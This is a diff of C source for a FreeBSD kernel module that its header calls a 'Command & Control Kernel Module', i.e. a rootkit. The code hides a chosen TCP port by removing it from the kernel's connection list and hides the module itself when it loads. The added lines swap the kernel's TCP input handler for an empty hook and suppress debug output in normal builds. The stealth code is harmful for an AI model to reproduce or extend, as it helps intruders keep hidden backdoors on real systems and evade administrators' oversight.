@@ -1,28 +1,25 @@
 /*
- * =====================================================================================
+ * =================================================================================
  *
  *       Filename:  control_module.c
  *
- *    Description:  Network & Module Hiding
+ *    Description:  FreeBSD Command & Control Kernel Module --
  *
  *        Version:  1.0
  *        Created:  2012-05-30 01:13:16
  *       Revision:  none
- *       Compiler:  gcc
+ *       Compiler:  clang
  *
- *         Author:  Steffen L. Norgren (http://trollop.org), ironix@trollop.org
+ *         Author:  Steffen L. Norgren (http://nein.ca), ironix@nein.ca
  *        Company:  Esurient Systems Inc.
  *
- * =====================================================================================
+ * =================================================================================
  */
 #include "control_module.h"
 
 /* System call to hide an open local network port. */
-static int hide_port(struct thread *td, void *syscall_args)
+static void hide_port(int lport)
 {
-    struct hidden_port_args *uap;
-    uap = (struct hidden_port_args *)syscall_args;
-
     struct inpcb *inpb;
 
     INP_INFO_WLOCK(&tcbinfo);
@@ -36,7 +33,7 @@ static int hide_port(struct thread *td, void *syscall_args)
         INP_WLOCK(inpb);
 
         /* Check to see if this is the port we want hidden */
-        if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
+        if (lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
             LIST_REMOVE(inpb, inp_list);
 
 		/* unlock writing to the kernel struct */
@@ -44,18 +41,10 @@ static int hide_port(struct thread *td, void *syscall_args)
     }
 
     INP_INFO_WUNLOCK(&tcbinfo);
-
-    return 0;
 }
 
-/* The system event for the port hiding call */
-static struct sysent hidden_port_sysent = {
-    1,          /* number of arguments */
-    hide_port   /* implementing function */
-};
-
-/* The offset in sysent[] where the system call is to be allocated. */
-static int offset = NO_SYSCALL;
+static void tcp_input_hook(struct mbuf *m, int off0) {
+}
 
 static void hide_module(void)
 {
@@ -115,16 +104,24 @@ static int module_events(struct module *module, int cmd, void *arg)
 
     switch (cmd) {
         case MOD_LOAD:
+#if DEBUG
             uprintf("Module %s loaded.\n", MODULE_FILE);
+#endif
 
             if (MODULE_HIDE) {
+#if DEBUG
                 uprintf("Hiding %s module.\n", MODULE_FILE);
+#endif
                 hide_module();
             }
+			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input_hook;
             break;
 
         case MOD_UNLOAD:
+#if DEBUG
             uprintf("Module %s unloaded.\n", MODULE_FILE);
+#endif
+			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input;
             break;
 
         default:
@@ -141,5 +138,4 @@ static moduledata_t control_module_mod = {
     NULL            /* extra data */
 };
 
-//SYSCALL_MODULE(control_module, &offset, &hidden_port_sysent, module_events, NULL);
 DECLARE_MODULE(control_module, control_module_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
